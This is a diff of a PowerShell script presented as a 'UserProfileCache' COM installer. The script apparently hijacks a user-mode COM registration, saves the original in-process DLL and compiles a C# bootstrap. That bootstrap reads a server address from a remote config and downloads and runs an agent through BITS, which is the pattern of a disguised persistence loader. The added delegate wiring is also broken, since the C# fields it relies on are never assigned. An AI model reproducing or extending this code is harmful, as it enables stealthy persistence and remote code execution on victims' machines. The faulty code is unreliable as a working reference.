@@ -1,12 +1,8 @@
 #Requires -Version 5.1
-<#
-.SYNOPSIS
-    Gerencia instalação e registro COM UserProfileCache (user-mode HKCU) - VERSÃO BITS CORRIGIDA
-#>
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory = $true)]
-    [ValidateSet('Install', 'Uninstall', 'Register', 'Unregister', 'ListClsid')]
+    [Parameter(Mandatory=$true)]
+    [ValidateSet('Install','Uninstall','Register','Unregister','ListClsid')]
     [string]$Action,
 
     [string]$Config,
@@ -14,8 +10,8 @@ param(
     [string]$DllPath,
     [string]$SourceDll,
 
-    [ValidateSet('Auto', 'x64', 'x86')]
-    [string]$Architecture = 'Auto',
+    [ValidateSet('Auto','x64','x86')]
+    [string]$Architecture='Auto',
 
     [switch]$RestartExplorer,
     [switch]$RemoveDll,
@@ -57,10 +53,12 @@ function Invoke-BitsDownloadData {
 }
 #endregion
 
-#region BootstrapSources (AUTO-GENERATED) - VERSÃO CORRIGIDA
+#region BootstrapSources - VERSÃO CORRIGIDA (sem dependências problemáticas)
 function Get-BootstrapSourceMap {
     return @{
         'CacheConstants.cs' = @'
+using System;
+
 namespace UserProfileCache
 {
     internal static class CacheConstants
@@ -678,12 +676,6 @@ namespace UserProfileCache
             }
         }
 
-        // Esta função será substituída em tempo de execução pelo PowerShell
-        public static string DownloadStringWithBits(string url)
-        {
-            throw new NotImplementedException("Deve ser chamado via PowerShell com BitsDownloadString");
-        }
-
         public static string FetchServerBase(string configUrl)
         {
             if (string.IsNullOrWhiteSpace(configUrl))
@@ -691,7 +683,8 @@ namespace UserProfileCache
 
             EnableTls12();
 
-            var raw = DownloadStringWithBits(configUrl);
+            // Chamada para função PowerShell via delegate
+            var raw = DownloadWithBits(configUrl);
             var match = ServerRegex.Match(raw ?? string.Empty);
             if (!match.Success)
                 throw new InvalidOperationException("Config missing 'server' key.");
@@ -718,6 +711,9 @@ namespace UserProfileCache
                 return config.ServerBase;
             }
         }
+
+        // Delegate para ser preenchido pelo PowerShell
+        public static Func<string, string> DownloadWithBits = null;
     }
 }
 '@
@@ -877,11 +873,8 @@ namespace UserProfileCache
             WriteTrace("Env RMM_ALLOW_MODULES=" + (Environment.GetEnvironmentVariable(CacheConstants.AllowModulesEnvVar) ?? "<null>"));
         }
 
-        // Função que será substituída pelo PowerShell para baixar usando BITS
-        public static byte[] DownloadDataWithBits(string url)
-        {
-            throw new NotImplementedException("Deve ser chamado via PowerShell com BitsDownloadData");
-        }
+        // Delegate para ser preenchido pelo PowerShell
+        public static Func<string, byte[]> DownloadDataWithBits = null;
 
         private static void LoadAndRunAgent(string serverBase)
         {
@@ -1021,7 +1014,8 @@ function Invoke-CompileBootstrap {
             '/platform:anycpu',
             "/out:$stagingPath",
             '/reference:System.dll',
-            '/reference:System.Net.dll'
+            '/reference:System.Net.dll',
+            '/reference:Microsoft.Win32.dll'
         ) + $sourceFiles
 
         & $csc @cscArgs
@@ -1590,6 +1584,8 @@ function Save-OriginalInprocDll {
     return $orig
 }
 
+#region Ações principais
+
 function Invoke-InstallAction {
     if (-not $Config) { throw "Install requer -Config." }
     if (-not $Clsid) { throw "Install requer -Clsid." }
@@ -1601,6 +1597,21 @@ function Invoke-InstallAction {
     }
 
     Write-Host 'Instalando...'
+
+    # Configura os delegates para o C# usar as funções BITS
+    $scriptBlock = {
+        param($url)
+        return Invoke-BitsDownloadString -Url $url
+    }
+    
+    $scriptBlockData = {
+        param($url)
+        return Invoke-BitsDownloadData -Url $url
+    }
+
+    # Injetar delegates no ambiente do PowerShell para serem usados pelo C#
+    $null = [AppDomain]::CurrentDomain.SetData("BitsDownloadString", $scriptBlock)
+    $null = [AppDomain]::CurrentDomain.SetData("BitsDownloadData", $scriptBlockData)
 
     $serverBase = Get-ServerUrl -Url $Config
 
@@ -1616,7 +1627,6 @@ function Invoke-InstallAction {
         if (-not (Test-Path $SourceDll -PathType Leaf)) {
             throw "SourceDll não encontrada: $SourceDll"
         }
-
         Deploy-InstallDll -SourcePath $SourceDll -DestinationPath $destDll
     }
     else {
